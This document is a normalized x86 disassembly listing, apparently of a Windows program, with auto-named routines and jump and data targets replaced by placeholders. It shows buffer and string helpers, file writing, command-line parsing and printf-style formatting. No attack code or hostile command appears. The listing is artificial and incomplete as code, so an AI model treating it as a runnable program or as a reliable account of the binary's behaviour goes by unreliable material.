cmp ebx [ ebp + 0x10 ]
jl r-xdata
push edi
mov ecx esi
call sub_407eb0
mov eax edi
sar eax 0x8
push eax
mov ecx esi
call sub_407eb0
mov eax edi
sar eax 0x10
push eax
mov ecx esi
call sub_407eb0
mov eax edi
sar eax 0x18
push eax
mov ecx esi
call sub_407eb0
xor ebx ebx
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
add edi 0x8
add [ eax ] edi
mov eax [ ebp + 0x1c ]
movzx eax [ ebx + eax ]
push eax
mov ecx esi
call sub_407eb0
inc ebx
cmp ebx edi
jl r-xdata
sub_40797c
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
jge r-xdata
lea ecx [ esi + 0x8 ]
pop esi
jmp sub_407e74
push ebx
push edi
mov edi rw-data
push eax
mov ecx edi
call sub_407e92
mov cl [ esi ]
mov [ eax ] cl
mov ebx [ esi ]
mov eax [ esi + 0x4 ]
sar ebx 0x8
inc eax
push eax
mov ecx edi
call sub_407e92
mov [ eax ] bl
mov eax [ esi + 0x4 ]
movsx ebx [ esi + 0x2 ]
inc eax
inc eax
push eax
mov ecx edi
call sub_407e92
mov [ eax ] bl
mov eax [ esi + 0x4 ]
movsx ebx [ esi + 0x3 ]
add eax 0x3
push eax
mov ecx edi
call sub_407e92
pop edi
mov [ eax ] bl
pop ebx
sub_4079e2
push ebp
mov ebp esp
sub esp 0x18
push ebx
push edi
mov edi ecx
lea ecx [ ebp - 0x18 ]
call sub_407e64
xor ebx ebx
push ebx
push 0x80
push 0x2
push ebx
push ebx
push 0x40000000
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
cmp eax ebx
mov [ ebp - 0x4 ] eax
jne r-xdata
push esi
mov esi [ edi + 0xc ]
test esi esi
jle r-xdata
xor bl bl
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
mov bl 0x1
pop esi
jmp r-xdata
add edi 0x4
lea ecx [ ebp - 0x18 ]
call sub_407e74
lea ecx [ ebp + 0x8 ]
call sub_407e74
pop edi
mov al bl
pop ebx
leave
retn 0x10
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push ebx
mov ecx edi
call sub_407e92
push eax
push [ ebp - 0x4 ]
call [ WriteFile@IAT ]
inc ebx
cmp ebx esi
jl r-xdata
sub_407a67
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
mov esi ecx
xor edi edi
cmp [ esi ] edi
jne r-xdata
pop edi
pop esi
leave
retn
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
push ebx
push eax
call sub_409875
cmp [ esi + 0xc ] edi
pop ecx
mov ebx eax
jle r-xdata
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push ebx
push [ esi + 0xc ]
call sub_40649d
lea edi [ esi + 0x4 ]
add esp 0x10
mov ecx edi
call sub_401c44
and [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
push edi
lea ecx [ esi + 0x4 ]
call sub_407e92
mov al [ eax ]
mov [ edi + ebx ] al
inc edi
cmp edi [ esi + 0xc ]
jl r-xdata
push [ ebp - 0xc ]
call sub_4092d2
push ebx
call sub_40957e
push 0x100
mov [ esi ] 0x1
call sub_409984
add esp 0xc
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] eax
call sub_407e64
xor edi edi
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
movzx eax [ ecx + eax ]
push eax
mov ecx edi
call sub_407eb0
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jl r-xdata
mov eax edi
push 0x7
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
push 0x9
mov eax edi
pop ecx
cdq
idiv ecx
lea ecx [ ebp - 0x24 ]
add dl 0x61
push edx
call sub_407eb0
inc edi
cmp edi 0x9d
jl r-xdata
push 0x9
mov eax edi
pop ecx
cdq
idiv ecx
lea ecx [ ebp - 0x24 ]
add dl 0x30
push edx
call sub_407eb0
push 0x14
mov eax edi
pop ecx
cdq
idiv ecx
lea ecx [ ebp - 0x24 ]
add dl 0x61
push edx
call sub_407eb0
push 0xf
pop ecx
mov eax edi
cdq
idiv ecx
push 0x7a
pop eax
lea ecx [ ebp - 0x24 ]
sub al dl
push eax
call sub_407eb0
mov eax [ ebp - 0x1c ]
mov ebx eax
add eax 0xfffffffe
push eax
lea ecx [ ebp - 0x24 ]
call sub_407e92
movsx eax [ eax ]
dec ebx
push ebx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x4 ] eax
call sub_407e92
movsx eax [ eax ]
add eax [ ebp - 0x4 ]
lea ecx [ ebp - 0x24 ]
sar eax 0x1
push eax
call sub_407eb0
mov eax edi
push 0x3
cdq
pop ecx
idiv ecx
test edx edx
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_406bb8
push [ esi + 0xc ]
call sub_409984
push [ esi + 0xc ]
mov edi eax
push [ esi + 0x8 ]
push edi
call sub_4098f3
lea eax [ ebp - 0x14 ]
push eax
push [ esi + 0xc ]
push edi
call sub_406c26
push [ esi + 0xc ]
push edi
push [ esi + 0x8 ]
call sub_4098f3
push edi
call sub_4092d2
add esp 0x38
lea ecx [ ebp - 0x24 ]
call sub_407e74
push [ ebp - 0x14 ]
call sub_4092d2
pop ecx
pop ebx
sub_407c26
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
imul eax eax 0x3
cdq
sub eax edx
mov ebx eax
sar ebx 0x1
add ebx 0x10
cmp edi 0x6400000
mov esi ecx
ja r-xdata
xor al al
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp edi [ esi ]
jl r-xdata
lea eax [ edi + 0x4 ]
push eax
mov [ esi + 0x8 ] edi
mov [ esi ] edi
call sub_409984
pop ecx
xor ecx ecx
cmp eax ecx
mov [ esi + 0x4 ] eax
jne r-xdata
mov [ esi + 0x8 ] edi
push ebx
call sub_409984
test eax eax
pop ecx
mov [ ebp + 0x8 ] eax
je r-xdata
inc edi
push edi
push ecx
push eax
call sub_409951
add esp 0xc
jmp r-xdata
mov [ esi ] ecx
mov [ esi + 0x8 ] ecx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push ebx
push 0x0
push eax
call sub_409951
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push [ ebp + 0x8 ]
call sub_409915
push [ esi + 0x4 ]
call sub_4092d2
mov eax [ ebp + 0x8 ]
add esp 0x1c
mov [ esi + 0x4 ] eax
mov [ esi ] ebx
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
mov [ eax + ecx ] 0x0
mov al 0x1
jmp r-xdata
sub_407ccf
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
xor ebx ebx
cmp edi ebx
mov esi ecx
mov [ esi + 0xc ] bl
je r-xdata
mov [ esi + 0x8 ] ebx
push edi
call [ lstrlenA@IAT ]
cmp eax 0x6400000
mov [ esi + 0x8 ] eax
jle r-xdata
mov [ esi + 0x4 ] ebx
add eax 0x4
push eax
call sub_409984
cmp eax ebx
pop ecx
mov [ esi + 0x4 ] eax
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax ebx
jle r-xdata
mov [ esi + 0x8 ] ebx
push [ esi + 0x8 ]
push edi
push eax
call sub_4098f3
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
add esp 0xc
mov [ eax + ecx ] bl
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
pop edi
mov eax esi
pop esi
pop ebx
retn 0x4
sub_407d38
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
xor ebx ebx
cmp edi ebx
mov esi ecx
mov [ esi + 0xc ] bl
je r-xdata
mov [ esi + 0x8 ] ebx
push edi
call [ lstrlenA@IAT ]
cmp eax 0x6400000
mov [ esi + 0x8 ] eax
jle r-xdata
mov [ esi + 0x4 ] ebx
add eax 0x4
push eax
call sub_409984
cmp eax ebx
pop ecx
mov [ esi + 0x4 ] eax
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax ebx
jle r-xdata
mov [ esi + 0x8 ] ebx
push [ esi + 0x8 ]
push edi
push eax
call sub_409915
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
add esp 0xc
mov [ eax + ecx ] bl
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
pop edi
mov eax esi
pop esi
pop ebx
retn 0x4
sub_407da1
push ebx
xor ebx ebx
cmp [ esp + 0x8 ] ebx
push esi
mov esi ecx
mov [ esi + 0xc ] bl
je r-xdata
mov [ esi + 0x8 ] ebx
mov eax [ esp + 0x10 ]
mov [ esi + 0x8 ] eax
jmp r-xdata
mov [ esi + 0x4 ] ebx
add eax 0x4
push eax
call sub_409984
cmp eax ebx
pop ecx
mov [ esi + 0x4 ] eax
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax ebx
jle r-xdata
mov [ esi + 0x8 ] ebx
push [ esi + 0x8 ]
push [ esp + 0x10 ]
push eax
call sub_409915
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
add esp 0xc
mov [ eax + ecx ] bl
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
mov eax esi
pop esi
pop ebx
retn 0x8
sub_407e01
push ebx
push esi
mov esi ecx
xor ebx ebx
push edi
mov edi [ esp + 0x10 ]
mov [ esi + 0xc ] bl
mov eax [ edi + 0x8 ]
cmp eax 0x6400000
mov [ esi + 0x8 ] eax
jle r-xdata
mov eax [ esi + 0x8 ]
cmp eax ebx
jle r-xdata
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] ebx
add eax 0x4
push eax
call sub_409984
cmp eax ebx
pop ecx
mov [ esi + 0x4 ] eax
je r-xdata
mov [ esi + 0x8 ] ebx
push [ esi + 0x8 ]
push [ edi + 0x4 ]
push eax
call sub_409915
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
add esp 0xc
mov [ eax + ecx ] bl
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
pop edi
mov eax esi
pop esi
pop ebx
retn 0x4
sub_407e74
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
pop esi
retn
push eax
call sub_4092d2
pop ecx
sub_407eb0
push ebx
push ebp
push esi
mov esi ecx
mov ecx [ esi ]
xor ebx ebx
cmp ecx ebx
push edi
jne r-xdata
mov eax ecx
imul eax eax 0x3
cdq
sub eax edx
mov edi eax
sar edi 0x1
add edi 0x10
mov edi 0x100
jmp r-xdata
cmp ecx [ esi + 0x8 ]
jg r-xdata
mov [ esi + 0x8 ] ebx
cmp [ esi + 0x8 ] ebx
jge r-xdata
inc [ esi + 0x8 ]
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
mov dl [ esp + 0x14 ]
mov [ ecx + eax - 0x1 ] dl
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
mov [ eax + ecx ] bl
mov eax [ esi + 0x8 ]
dec eax
cmp [ esi + 0x4 ] ebx
lea eax [ edi + 0x4 ]
push eax
jne r-xdata
call sub_409984
mov ebp eax
cmp ebp ebx
pop ecx
je r-xdata
call sub_409984
cmp eax ebx
pop ecx
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] ebx
jne r-xdata
or eax 0xffffffff
jmp r-xdata
push edi
push ebx
push ebp
call sub_409951
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push ebp
call sub_409915
push [ esi + 0x4 ]
call sub_4092d2
add esp 0x1c
mov [ esi + 0x4 ] ebp
mov [ esi ] edi
mov [ esi ] ebx
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
sub_407f74
push ebp
mov ebp esp
push esi
push edi
push ecx
mov ecx [ ebp + 0x8 ]
call sub_407e01
mov edi [ ebp + 0x14 ]
xor esi esi
test edi edi
jle r-xdata
lea ecx [ ebp + 0xc ]
call sub_407e74
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
retn 0x14
push esi
lea ecx [ ebp + 0xc ]
call sub_407e92
movzx eax [ eax ]
mov ecx [ ebp + 0x8 ]
push eax
call sub_407eb0
inc esi
cmp esi edi
jl r-xdata
sub_407fb6
push esi
push ecx
mov ecx [ esp + 0xc ]
call sub_407e01
mov esi [ esp + 0xc ]
push esi
call [ lstrlenA@IAT ]
test eax eax
jle r-xdata
mov eax [ esp + 0x8 ]
pop esi
retn 0x8
push edi
mov edi eax
movzx eax [ esi ]
mov ecx [ esp + 0xc ]
push eax
call sub_407eb0
inc esi
dec edi
jne r-xdata
pop edi
sub_407fed
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
call sub_401c44
mov esi [ ebp + 0xc ]
push esi
call [ lstrlenA@IAT ]
cmp eax 0x6400000
jg r-xdata
mov ecx [ ebp + 0x8 ]
push edi
call sub_407e01
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebp
retn 0x8
test eax eax
jle r-xdata
push ebx
mov ebx eax
movzx eax [ esi ]
push eax
mov ecx edi
call sub_407eb0
inc esi
dec ebx
jne r-xdata
pop ebx
sub_408033
push ebp
mov ebp [ esp + 0x8 ]
push edi
mov edi [ ebp + 0x8 ]
mov eax ecx
cmp [ eax + 0x8 ] edi
je r-xdata
push ebx
push esi
xor esi esi
test edi edi
jle r-xdata
xor al al
jmp r-xdata
mov al 0x1
mov ebx [ eax + 0x4 ]
pop edi
pop ebp
retn 0x4
xor al al
jmp r-xdata
inc esi
cmp esi edi
jl r-xdata
pop esi
pop ebx
push esi
mov ecx ebp
call sub_407e92
mov cl [ ebx + esi ]
cmp cl [ eax ]
jne r-xdata
sub_408073
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0x10 ]
lea eax [ ebp - 0xd ]
push eax
mov esi ecx
call sub_407fed
lea ecx [ ebp - 0xd ]
call sub_407e74
mov ecx [ ebp + 0x8 ]
push esi
call sub_407e01
lea ecx [ ebp + 0xc ]
call sub_407e74
mov eax [ ebp + 0x8 ]
pop esi
leave
retn 0x14
sub_4080ce
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
cmp edi [ esi + 0x8 ]
jg r-xdata
or eax 0xffffffff
test edi edi
jl r-xdata
push ebx
mov ebx [ esp + 0x14 ]
push ebx
call sub_407eb0
mov eax [ esi + 0x8 ]
jmp r-xdata
dec eax
cmp eax edi
jg r-xdata
mov ecx [ esi + 0x4 ]
add ecx eax
mov dl [ ecx - 0x1 ]
mov [ ecx ] dl
mov eax [ esi + 0x4 ]
mov [ edi + eax ] bl
mov eax edi
pop ebx
jmp r-xdata
pop edi
pop esi
retn 0x8
sub_40813c
push 0x27f5a5a
xor eax eax
fninit
fnstsw [ esp ]
cmp [ esp ] al
jne r-xdata
pop edx
retn
fnstcw [ esp ]
mov dx 0x103f
and edx [ esp ]
cmp dx 0x3f
jne r-xdata
inc eax
fldcw [ esp + 0x2 ]
sub_408191
push esi
mov esi [ esp + 0x8 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
xor eax eax
add esi 0x4
call eax
cmp [ esp + 0x10 ] 0x0
je r-xdata
test eax eax
jne r-xdata
pop esi
retn
sub_4081b8
push esi
push edi
xor edx edx
mov esi [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov edi [ esp + 0x18 ]
push edx
jecxz r-xdata
cmp al 0x20
jbe r-xdata
lea eax [ edx + 0x10 ]
mov ecx [ esp + 0x14 ]
pop edx
jecxz r-xdata
xor eax eax
stosd [ edi ]
mov [ ecx ] eax
lodsb [ esi ]
dec esi
xor eax eax
jecxz r-xdata
pop edi
pop esi
retn
mov [ ecx ] edx
inc [ esp ]
add edx 0x5
mov ah 0x20
stosb [ edi ]
mov [ ecx ] edi
add ecx 0x4
cmp al 0x5c
jne r-xdata
xor ah 0x20
je r-xdata
cmp al ah
jbe r-xdata
push ecx
xor ecx ecx
lodsb [ esi ]
lodsb [ esi ]
test al al
je r-xdata
jecxz r-xdata
inc ecx
lodsb [ esi ]
cmp al 0x5c
je r-xdata
dec esi
cmp al 0x22
jne r-xdata
inc edx
jmp r-xdata
stosb [ edi ]
add edx ecx
mov al 0x5c
cmp [ esp ] 0x0
je r-xdata
shr ecx 0x1
jae r-xdata
pop ecx
lodsb [ esi ]
cmp al 0x5c
jne r-xdata
[ edi ]
dec esi
cmp al 0x22
jne r-xdata
lodsb [ esi ]
sub_40823c
push esi
push edi
push ebx
xor eax eax
cdq
mov esi [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov edi [ esp + 0x1c ]
push edx
jecxz r-xdata
cmp eax 0x20
jbe r-xdata
lea eax [ edx + 0x10 ]
mov ecx [ esp + 0x18 ]
pop edx
jecxz r-xdata
stosd [ edi ]
mov [ ecx ] eax
lodsw [ esi ]
dec esi
dec esi
xor eax eax
jecxz r-xdata
pop ebx
pop edi
pop esi
retn
mov [ ecx ] edx
inc [ esp ]
add edx 0x6
xor ebx ebx
mov bl 0x20
stosw [ edi ]
mov [ ecx ] edi
add ecx 0x4
cmp eax 0x5c
jne r-xdata
xor ebx 0x20
je r-xdata
cmp eax ebx
jbe r-xdata
push ecx
xor ecx ecx
lodsw [ esi ]
lodsw [ esi ]
test eax eax
je r-xdata
jecxz r-xdata
inc ecx
lodsw [ esi ]
cmp eax 0x5c
je r-xdata
dec esi
dec esi
cmp eax 0x22
jne r-xdata
inc edx
inc edx
jmp r-xdata
stosw [ edi ]
add edx ecx
xor eax eax
cmp [ esp ] eax
mov al 0x5c
je r-xdata
shr ecx 0x1
jae r-xdata
pop ecx
lodsw [ esi ]
cmp eax 0x5c
jne r-xdata
[ edi ]
dec esi
dec esi
cmp eax 0x22
jne r-xdata
lodsw [ esi ]
sub_4082d5
mov ecx [ eax + 0x8 ]
cmp ecx [ eax + 0xc ]
push esi
lea esi [ ecx + 0x1 ]
mov [ eax + 0x8 ] esi
pop esi
jae r-xdata
retn
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov ecx [ eax ]
mov [ ecx ] dl
inc [ eax ]
push [ eax ]
push edx
call sub_4094da
pop ecx
pop ecx
retn
sub_4082fd
push ebp
mov ebp esp
sub esp 0x28
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] 0x78
push edi
mov edi eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] bl
mov ecx r--data
je r-xdata
xor edx edx
inc edx
cmp [ esi + 0x15 ] 0xffffffff
jne r-xdata
mov ecx r--data
mov [ esi + 0xc ] 0x20
mov [ esi + 0x15 ] edx
jmp r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
je r-xdata
cmp [ esi + 0x19 ] 0x68
jne r-xdata
mov eax edi
cmp edi ebx
jge r-xdata
movsx edi di
and edi 0xffff
jmp r-xdata
jbe r-xdata
cmp [ esi + 0x15 ] ebx
je r-xdata
mov eax edi
neg eax
jmp r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor edx edx
div [ ebp + 0xc ]
mov ebx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
test eax eax
mov dl [ edx + ecx ]
mov [ ebp + ebx - 0x28 ] dl
ja r-xdata
mov [ ebp - 0x28 ] 0x30
mov [ ebp - 0x8 ] edx
cmp eax ebx
cmp eax ebx
jne r-xdata
mov eax [ esi + 0x15 ]
mov ebx [ ebp - 0x8 ]
cmp ebx eax
ja r-xdata
cmp edi ebx
jl r-xdata
xor ebx ebx
mov ecx [ ebp - 0x8 ]
cmp ecx eax
mov [ ebp + 0x14 ] ecx
ja r-xdata
mov ebx eax
mov [ ebp - 0x1 ] 0x2d
cmp [ esi + 0x4 ] ebx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp + 0x14 ] eax
cmp [ esi + 0x8 ] ebx
je r-xdata
mov [ ebp - 0x1 ] 0x2b
jmp r-xdata
xor edi edi
cmp [ esi + 0xd ] edi
je r-xdata
inc [ ebp + 0x14 ]
mov [ ebp - 0x1 ] 0x20
jmp r-xdata
cmp [ esi ] edi
jne r-xdata
cmp [ ebp + 0x10 ] 0x6f
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp [ esi + 0xc ] 0x20
jne r-xdata
cmp [ esi + 0xd ] edi
je r-xdata
cmp [ esi ] edi
jne r-xdata
cmp [ esi + 0xd ] edi
je r-xdata
movzx edx [ ebp - 0x1 ]
mov eax [ ebp + 0x8 ]
call sub_4082d5
mov eax [ esi + 0x11 ]
cmp [ ebp + 0x14 ] eax
jae r-xdata
cmp [ ebp + 0xc ] 0x8
je r-xdata
cmp ebx ecx
jbe r-xdata
cmp [ esi + 0xc ] 0x30
jne r-xdata
cmp [ esi ] edi
jne r-xdata
cmp [ ebp + 0xc ] 0x8
je r-xdata
sub eax [ ebp + 0x14 ]
mov edi eax
je r-xdata
inc [ ebp + 0x14 ]
cmp [ ebp + 0xc ] 0x10
jne r-xdata
mov [ esi + 0xd ] edi
mov eax [ ebp + 0x14 ]
cmp eax [ esi + 0x11 ]
jae r-xdata
sub ebx [ ebp - 0x8 ]
mov edi ebx
je r-xdata
cmp [ esi + 0xc ] 0x30
jne r-xdata
push 0x30
pop edx
cmp [ ebp + 0xc ] 0x10
jne r-xdata
xor edi edi
mov eax [ ebp + 0x8 ]
push 0x20
pop edx
call sub_4082d5
dec edi
jne r-xdata
inc [ ebp + 0x14 ]
mov [ esi + 0xd ] edi
mov edi [ ebp - 0x8 ]
test edi edi
jbe r-xdata
mov eax [ ebp + 0x8 ]
push 0x30
pop edx
call sub_4082d5
dec edi
jne r-xdata
mov eax [ esi + 0x11 ]
cmp [ ebp + 0x14 ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push 0x30
pop edx
call sub_4082d5
movzx edx [ ebp + 0x10 ]
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
lea ebx [ ebp - 0x28 ]
dec ebx
sub eax [ ebp + 0x14 ]
mov edi eax
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_4082d5
pop edi
pop ebx
leave
retn
mov eax [ esi + 0x11 ]
cmp [ ebp + 0x14 ] eax
jae r-xdata
movzx edx [ ebx + edi ]
mov eax [ ebp + 0x8 ]
call sub_4082d5
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
push 0x30
pop edx
call sub_4082d5
dec edi
jne r-xdata
sub eax [ ebp + 0x14 ]
mov edi eax
je r-xdata
movzx edx [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
call sub_4082d5
dec edi
jne r-xdata
sub_4084ee
mov ecx [ edx ]
push ebx
push esi
mov esi eax
mov eax ecx
and eax 0x80000000
neg eax
sbb eax eax
shr ecx 0x14
and eax 0xfffffffe
and ecx 0x7ff
sub ecx 0x3ff
inc eax
cmp [ esi + 0x15 ] 0xffffffff
mov ebx ecx
jne r-xdata
and [ edx ] 0xfffff
test eax eax
jle r-xdata
mov [ esi + 0x15 ] 0x6
mov al 0x2d
cmp [ esi + 0x4 ] 0x0
je r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov al 0x2b
jmp r-xdata
mov eax [ esp + 0xc ]
push 0x65
pop edx
call sub_4082d5
push 0x0
push 0x64
push 0xa
push [ esp + 0x18 ]
mov eax ebx
call sub_4082fd
add esp 0x10
pop esi
pop ebx
retn
mov al 0x20
jmp r-xdata
movzx edx al
mov eax [ esp + 0xc ]
call sub_4082d5
sub_408570
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
cmp [ eax + 0xc ] ebx
mov [ ebp + 0x8 ] esi
jne r-xdata
cmp [ esi ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push edi
mov edi [ ebp + 0x10 ]
add edi 0xfffffffc
jmp r-xdata
pop esi
pop ebx
leave
retn
mov al [ esi ]
or [ ebp - 0x17 ] 0xffffffff
xor ecx ecx
inc ecx
test al al
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] 0x20
mov [ ebp - 0x1f ] ebx
mov [ ebp - 0x1b ] ebx
mov [ ebp - 0x13 ] 0x0
je r-xdata
movzx eax [ esi ]
lea edx [ eax - 0x30 ]
cmp edx 0xa
jae r-xdata
cmp al 0x25
je r-xdata
cmp [ esi ] 0x2a
jne r-xdata
mov edx [ ebp - 0x1b ]
imul edx edx 0xa
lea eax [ edx + eax - 0x30 ]
inc esi
mov [ ebp - 0x1b ] eax
movzx eax [ esi ]
lea edx [ eax - 0x30 ]
cmp edx 0xa
jb r-xdata
cmp [ esi ] 0x0
je r-xdata
movzx edx al
mov eax [ ebp + 0xc ]
call sub_4082d5
inc esi
mov al [ esi ]
xor ecx ecx
inc ecx
test al al
mov [ ebp + 0x8 ] esi
jne r-xdata
cmp [ esi ] 0x2e
jne r-xdata
add edi 0x4
mov eax [ edi ]
cmp eax ebx
jge r-xdata
mov [ ebp + 0x8 ] esi
inc esi
mov al [ esi ]
cmp al 0x2d
mov [ ebp + 0x8 ] esi
jne r-xdata
mov al [ esi ]
cmp al 0x68
je r-xdata
inc esi
movzx eax [ esi ]
lea ecx [ eax - 0x30 ]
cmp ecx 0xa
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x17 ] ebx
jae r-xdata
inc esi
mov [ ebp - 0x1b ] eax
mov [ ebp + 0x8 ] esi
neg eax
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x20 ] 0x20
cmp al 0x2b
jne r-xdata
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x20 ] 0x20
jmp r-xdata
inc esi
mov [ ebp - 0x13 ] al
mov [ ebp + 0x8 ] esi
cmp al 0x6c
je r-xdata
cmp [ esi ] 0x2a
jne r-xdata
mov ecx [ ebp - 0x17 ]
imul ecx ecx 0xa
lea eax [ ecx + eax - 0x30 ]
inc esi
mov [ ebp - 0x17 ] eax
movzx eax [ esi ]
lea ecx [ eax - 0x30 ]
cmp ecx 0xa
jb r-xdata
cmp al 0x20
jne r-xdata
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ebx
jmp r-xdata
test al al
jne r-xdata
pop edi
movzx eax cl
cmp eax 0x67
jg r-xdata
cmp al 0x4c
jne r-xdata
add edi 0x4
mov eax [ edi ]
cmp eax ebx
jl r-xdata
mov [ ebp + 0x8 ] esi
cmp al 0x30
jne r-xdata
cmp [ ebp - 0x28 ] ebx
jne r-xdata
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
inc esi
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x17 ] eax
cmp al 0x23
jne r-xdata
cmp [ ebp - 0x2c ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ecx
jmp r-xdata
push ebx
push 0x64
sub eax 0x5
je r-xdata
push [ ebp + 0xc ]
add edi 0x4
mov eax [ edi ]
mov [ ebp - 0xc ] eax
add edi 0x4
mov eax [ edi ]
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x10 ]
lea eax [ ebp - 0x2c ]
call sub_4084ee
pop ecx
jmp r-xdata
cmp eax 0x61
jg r-xdata
mov [ ebp - 0x1f ] ecx
mov [ ebp - 0x20 ] al
jmp r-xdata
xor ebx ebx
add edi 0x4
cmp [ ebp - 0x13 ] 0x68
mov eax [ edi ]
jne r-xdata
dec eax
je r-xdata
mov esi [ ebp + 0x8 ]
inc esi
cmp [ esi ] 0x0
mov [ ebp + 0x8 ] esi
jne r-xdata
sub eax 0x62
je r-xdata
je r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
push 0x1
push 0x6f
push 0x8
jmp r-xdata
dec eax
je r-xdata
push 0x1
push 0x62
push 0x2
jmp r-xdata
dec eax
je r-xdata
cmp eax 0x25
je r-xdata
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov cx [ ecx + 0x8 ]
mov [ eax ] cx
jmp r-xdata
push [ ebp + 0xc ]
add edi 0x4
mov eax [ edi ]
lea esi [ ebp - 0x2c ]
call sub_4082fd
add esp 0x10
push 0x8
pop eax
push 0x1
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] 0x30
mov [ ebp - 0x1f ] ebx
mov [ ebp - 0x1b ] eax
mov [ ebp - 0x17 ] eax
mov [ ebp - 0x13 ] 0x0
push 0x58
jmp r-xdata
sub eax 0x3
je r-xdata
add edi 0x4
movzx edx [ edi ]
dec eax
jne r-xdata
push 0x25
pop edx
jmp r-xdata
cmp eax 0x41
je r-xdata
push 0x10
jmp r-xdata
add edi 0x4
cmp [ ebp - 0x17 ] 0xffffffff
mov ebx [ edi ]
jne r-xdata
dec eax
dec eax
je r-xdata
mov eax [ ebp + 0xc ]
call sub_4082d5
jmp r-xdata
cmp eax 0x44
jle r-xdata
test ebx ebx
jne r-xdata
and [ ebp - 0x17 ] 0x0
push 0x1
push 0x75
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp eax 0x47
jle r-xdata
push ebx
call sub_409f34
pop ecx
mov ecx [ ebp - 0x17 ]
test ecx ecx
